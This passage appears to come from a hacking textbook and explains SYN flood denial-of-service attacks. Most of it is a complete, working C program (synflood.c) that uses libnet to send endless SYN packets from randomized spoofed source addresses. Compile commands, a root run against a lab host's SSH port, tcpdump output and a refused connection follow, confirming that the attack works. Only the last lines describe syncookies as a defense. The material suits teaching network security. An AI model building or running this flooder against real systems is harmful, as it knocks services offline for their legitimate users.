A SYN flood tries to exhaust states in the TCP/IP stack
Since TCP maintains "reliable" connections, each connection needs to be tracked somewhere
The TCP/IP stack in the kernel handles this, but it has a finite table that can only track so many incoming connections
A SYN flood uses spoofing to take advantage of this limitation

The attacker floods the victim's system with many SYN packets, using a spoofed nonexistent source address
Since a SYN packet is used to initiate a TCP connection, the victim's machine will send a SYN/ACK packet to the spoofed address in response and wait for the expected ACK response
Each of these waiting, half-open connections goes into a backlog queue that has limited space
Since the spoofed source addresses don't actually exist, the ACK responses needed to remove these entries from the queue and complete the connections never come
Instead, each half-open connection must time out, which takes a relatively long time

As long as the attacker continues to flood the victim's system with spoofed SYN packets, the victim's backlog queue will remain full, making it nearly impossible for real SYN packets to get to the system and initiate valid TCP/IP onnections

Using the Nemesis arpsoof source code as reference, we should be able to write a program that performs this attack
The example below uses libnet functions pulled from the source code and socket functions previously exaplained
The Nemesis source code uses the function libnet_get_prand() to obtain pseudo-random numbers for various IP fields
The function libnet_seed_prand() is used to seed the randomizer
These functions are used similarly before:

synflood.c
__________________________________________________________________________________
#include <libnet.h>

#define FLOOD_DELAY 5000 // delay between packet injects by 5000 ms 

/* returns an IP in x.x.x.x notation */
char *print_ip(u_long *ip_addr_ptr) {
   return inet_ntoa( *((struct in_addr *)ip_addr_ptr) );
}


int main(int argc, char *argv[]) {
   u_long dest_ip;
   u_short dest_port;
   u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;
   int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;

   if(argc < 3)
   {
      printf("Usage:\n%s\t <target host> <target port>\n", argv[0]);
      exit(1);
   }

   dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // the host 
   dest_port = (u_short) atoi(argv[2]); // the port 


   network = libnet_open_raw_sock(IPPROTO_RAW); // open network interface 
   if (network == -1)
      libnet_error(LIBNET_ERR_FATAL, "can't open network interface.  -- this program must run as root.\n");

   libnet_init_packet(packet_size, &packet); // allocate memory for packet 
   if (packet == NULL)
      libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");

   libnet_seed_prand(); // seed the random number generator 

   printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));
   while(1) // loop forever (until break by CTRL-C) 
   {
      libnet_build_ip(LIBNET_TCP_H,      // size of the packet sans IP header 
         IPTOS_LOWDELAY,                 // IP tos 
         libnet_get_prand(LIBNET_PRu16), // IP ID (randomized) 
         0,                              // frag stuff 
         libnet_get_prand(LIBNET_PR8),   // TTL (randomized) 
         IPPROTO_TCP,                    // transport protocol 
         libnet_get_prand(LIBNET_PRu32), // source IP (randomized) 
         dest_ip,                        // destination IP 
         NULL,                           // payload (none) 
         0,                              // payload length 
         packet);                        // packet header memory 

      libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // source TCP port (random) 
         dest_port,                      // destination TCP port 
         libnet_get_prand(LIBNET_PRu32), // sequence number (randomized) 
         libnet_get_prand(LIBNET_PRu32), // acknowledgement number (randomized) 
         TH_SYN,                         // control flags (SYN flag set only) 
         libnet_get_prand(LIBNET_PRu16), // window size (randomized) 
         0,                              // urgent pointer 
         NULL,                           // payload (none) 
         0,                              // payload length 
         packet + LIBNET_IP_H);          // packet header memory 

      if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
         libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");

      byte_count = libnet_write_ip(network, packet, packet_size); // inject packet 
      if (byte_count < packet_size)
         libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written.  (%d of %d bytes)", byte_count, packet_size);

      usleep(FLOOD_DELAY); // wait for FLOOD_DELAY milliseconds  
   }

   libnet_destroy_packet(&packet); // free packet memory 

   if (libnet_close_raw_sock(network) == -1) // close the network interface 
      libnet_error(LIBNET_ERR_WARNING, "can't close network interface.");

   return 0;
}
__________________________________________________________________________________

This program uses a print_ip() function to handle converting the u_long type, used by libnet to store IP addresses, to the struct type expected by inet_ntoa()
The value doesn't change-- the typecasting just appeases the compiler

The current release of libnet is version 1.1, which is incompatible with libnet 1.0
However, Nemesis and arpspoof still rely on the 1.0 version of libnet, so this version is included in the LiveCD and this is also what we will use in our synflood program
Similar to compiling with libpcap, when compiling with libnet, the flag -lnet is used
However, this isn't quite enough information for the compiler, as the output below shows:
__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc -o synflood synflood.c -lnet
In file included from synflood.c:1:
/usr/include/libnet.h:87:2: #error "byte order has not been specified, you'll"
synflood.c:6: error: syntax error before string constant
__________________________________________________________________________________

The compiler still fails because several mandatory define flags need to be set for libnet
Included with libnet, a program called libnet-config will output these flags
__________________________________________________________________________________
reader@hacking:~/booksrc $ libnet-config --help
Usage: libnet-config [OPTIONS]
Options:
        [--libs]
        [--cflags]
        [--defines]
reader@hacking:~/booksrc $ libnet-config --defines
-D_BSD_SOURCE -D__BSD_SOURCE -D__FAVOR_BSD -DHAVE_NET_ETHERNET_H
-DLIBNET_LIL_ENDIAN
__________________________________________________________________________________

Using the BASH shell's command substitution in both, these defines can be dynamically inserted into the compile command
__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o synflood
synflood.c -lnet
reader@hacking:~/booksrc $ ./synflood
Usage:
./synflood        <target host> <target port>
reader@hacking:~/booksrc $
reader@hacking:~/booksrc $ ./synflood 192.168.42.88 22
Fatal: can't open network interface. -- this program must run as root.
reader@hacking:~/booksrc $ sudo ./synflood 192.168.42.88 22
SYN Flooding port 22 of 192.168.42.88..
__________________________________________________________________________________

In the example above, the host 192.168.42.88 is a Windows XP machine running an openssh server on port 22 via cygwin
The tcpdump output below shows the spoofed SYN packets flooding the host from apparently random IPs
While the program is running, legitimate connections cannot be made to this port
__________________________________________________________________________________
reader@hacking:~/booksrc $ sudo tcpdump -i eth0 -nl -c 15 "host 192.168.42.88"
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
17:08:16.334498 IP 121.213.150.59.4584 > 192.168.42.88.22: S
751659999:751659999(0) win 14609
17:08:16.346907 IP 158.78.184.110.40565 > 192.168.42.88.22: S
139725579:139725579(0) win 64357
17:08:16.358491 IP 53.245.19.50.36638 > 192.168.42.88.22: S
322318966:322318966(0) win 43747
17:08:16.370492 IP 91.109.238.11.4814 > 192.168.42.88.22: S
685911671:685911671(0) win 62957
17:08:16.382492 IP 52.132.214.97.45099 > 192.168.42.88.22: S
71363071:71363071(0) win 30490
17:08:16.394909 IP 120.112.199.34.19452 > 192.168.42.88.22: S
1420507902:1420507902(0) win 53397
17:08:16.406491 IP 60.9.221.120.21573 > 192.168.42.88.22: S
2144342837:2144342837(0) win 10594
17:08:16.418494 IP 137.101.201.0.54665 > 192.168.42.88.22: S
1185734766:1185734766(0) win 57243
17:08:16.430497 IP 188.5.248.61.8409 > 192.168.42.88.22: S
1825734966:1825734966(0) win 43454
17:08:16.442911 IP 44.71.67.65.60484 > 192.168.42.88.22: S
1042470133:1042470133(0) win 7087
17:08:16.454489 IP 218.66.249.126.27982 > 192.168.42.88.22: S
1767717206:1767717206(0) win 50156
17:08:16.466493 IP 131.238.172.7.15390 > 192.168.42.88.22: S
2127701542:2127701542(0) win 23682
17:08:16.478497 IP 130.246.104.88.48221 > 192.168.42.88.22: S
2069757602:2069757602(0) win 4767
17:08:16.490908 IP 140.187.48.68.9179 > 192.168.42.88.22: S
1429854465:1429854465(0) win 2092
17:08:16.502498 IP 33.172.101.123.44358 > 192.168.42.88.22: S
1524034954:1524034954(0) win 26970
15 packets captured
30 packets received by filter
0 packets dropped by kernel
reader@hacking:~/booksrc $ ssh -v 192.168.42.88
OpenSSH_4.3p2, OpenSSL 0.9.8c 05 Sep 2006
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: Connecting to 192.168.42.88 [192.168.42.88] port 22.
debug1: connect to address 192.168.42.88 port 22: Connection refused
ssh: connect to host 192.168.42.88 port 22: Connection refused
__________________________________________________________________________________

Some operating systems (for example, Linux) use a technique called syncookies to try to prevent SYN flood attacks
The TCP stack using syncookies adjusts the initial acknowledgement number for the responding SYN/ACK packet using a value based on host details and time (to prevent replay attacks)
The TCP connections don't actually become active until the final ACK packet for the TCP handshake is checked
If the sequence number doesn't match or the ACK never arrives, a connection is never created
This helps prevent spoofed connection attempts, since the ACK packet requires information to be sent to the source of the initial SYN packet